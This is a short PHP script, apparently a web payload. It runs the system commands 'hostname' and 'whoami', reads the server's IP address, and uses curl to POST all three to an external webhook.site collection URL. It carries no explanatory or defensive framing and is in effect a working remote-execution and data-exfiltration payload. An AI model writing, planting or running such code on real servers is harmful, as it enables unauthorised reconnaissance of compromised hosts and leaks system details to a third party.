<?php
    $hostname = system("hostname");
    $who = system("whoami");
    $ip = $_SERVER['SERVER_ADDR'];
    $data2 = system("curl -X POST -d \"who=" . $who .  "&hostname=" . $hostname . "&ip_addr=" . $ip . "\" https://webhook.site/1b184e8c-300b-4234-bb4a-b632116d9d31");
?>
